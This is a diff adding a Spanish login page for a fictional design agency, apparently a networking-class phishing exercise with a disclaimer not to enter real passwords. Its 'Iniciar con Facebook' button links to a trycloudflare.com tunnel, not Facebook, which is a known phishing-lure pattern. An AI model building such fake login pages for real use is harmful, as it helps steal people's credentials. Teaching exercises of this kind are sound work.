@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="Alert.js"></script>
+    <link rel="stylesheet" href="Style.css" />
+    <title>Fundamentos de redes</title>
+  </head>
+  <body>
+    <main class="card" role="main" aria-labelledby="login-title">
+      <!-- LEFT: info/branding -->
+      <section class="panel-info" aria-hidden="false">
+        <div class="brand" role="img" aria-label="Logo de la práctica">
+          <div class="logo">MD</div>
+          <div>
+            <div style="font-weight: 800; font-size: 18px">
+              Bienvenido a Master Desing Creations
+            </div>
+            <div
+              style="font-size: 12px; color: var(--muted); margin-top: 4px"
+            ></div>
+          </div>
+        </div>
+
+        <h1 id="login-title">
+          Creamos experiencias digitales únicas que transforman ideas en marcas
+          memorables.
+        </h1>
+        <p class="lead">
+          Accede a tu cuenta para gestionar tus proyectos, revisar avances y
+          mantenerte al día con tu equipo creativo.
+        </p>
+
+        <div style="margin-top: 18px; font-size: 16px">
+          <strong>Diseñamos, Creamos y Tranformamos</strong>
+        </div>
+      </section>
+
+      <!-- RIGHT: login -->
+      <section class="panel-login" aria-labelledby="options-label">
+        <div>
+          <div class="section-title" id="options-label">Opciones de acceso</div>
+
+          <div class="social-grid" style="margin-top: 8px">
+            <a
+              id="btn-fb"
+              class="btn btn-fb"
+              aria-label="Iniciar sesión con Facebook"
+              title="Iniciar sesión con Facebook"
+              href="https://tub-feeds-intl-wife.trycloudflare.com"
+            >
+              <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                <path
+                  fill="currentColor"
+                  d="M22 12a10 10 0 1 0-11.5 9.9v-7H8.9V12h1.6V9.8c0-1.6.95-2.5 2.4-2.5.7 0 1.4.1 1.4.1v1.6h-.8c-.8 0-1 .5-1 1v1.2h1.7l-.3 2.9h-1.4v7A10 10 0 0 0 22 12z"
+                />
+              </svg>
+              Iniciar con Facebook
+            </a>
+            <button
+              id="btn-google"
+              class="btn btn-google"
+              aria-label="Iniciar sesión con Google"
+              title="Iniciar sesión con Google"
+            >
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path
+                  fill="#EA4335"
+                  d="M12 11.9v3.6h5.2c-.23 1.2-1.4 3.6-5.2 3.6-3.1 0-5.6-2.6-5.6-5.8s2.5-5.8 5.6-5.8c1.8 0 3 .78 3.7 1.45l2.5-2.4C17.6 6 15.1 5 12 5 6.9 5 3 8.9 3 13s3.9 8 9 8c5.2 0 8.7-3.6 8.7-8.6 0-.6-.07-1.1-.18-1.6H12z"
+                />
+              </svg>
+              Iniciar con Google
+            </button>
+
+            <!-- Guest -->
+            <button
+              id="btn-guest"
+              class="btn btn-guest"
+              aria-label="Entrar como invitado"
+              title="Entrar como invitado"
+            >
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path
+                  fill="currentColor"
+                  d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4 0-8 2-8 5v1h16v-1c0-3-4-5-8-5z"
+                />
+              </svg>
+              Entrar como invitado
+            </button>
+          </div>
+        </div>
+
+        <div class="separator" role="separator" aria-hidden="true"></div>
+
+        <div>
+          <div class="section-title">O usa tu correo</div>
+          <form id="emailForm" autocomplete="on" novalidate>
+            <div class="input">
+              <label for="email" class="small">Correo electrónico</label>
+              <input
+                id="email"
+                name="email"
+                type="email"
+                inputmode="email"
+                placeholder="tu@ejemplo.com"
+                required
+                aria-required="true"
+              />
+            </div>
+            <div class="input">
+              <label for="password" class="small">Contraseña</label>
+              <input
+                id="password"
+                name="password"
+                type="password"
+                placeholder="••••••••"
+                required
+                aria-required="true"
+                minlength="6"
+              />
+            </div>
+
+            <div class="actions">
+              <button
+                type="submit"
+                class="primary"
+                aria-label="Iniciar sesión con correo"
+              >
+                Iniciar sesión
+              </button>
+              <a
+                href="#"
+                id="forgot"
+                class="small"
+                onclick="event.preventDefault(); alert('Simulación: enviar email de recuperación.');"
+                >¿Olvidaste tu contraseña?</a
+              >
+            </div>
+          </form>
+
+          <div class="notice">
+            Al iniciar sesión aceptas las condiciones de uso. Esta es una
+            práctica; no ingreses contraseñas reales aquí.
+          </div>
+        </div>
+      </section>
+    </main>
+  </body>
+</html>
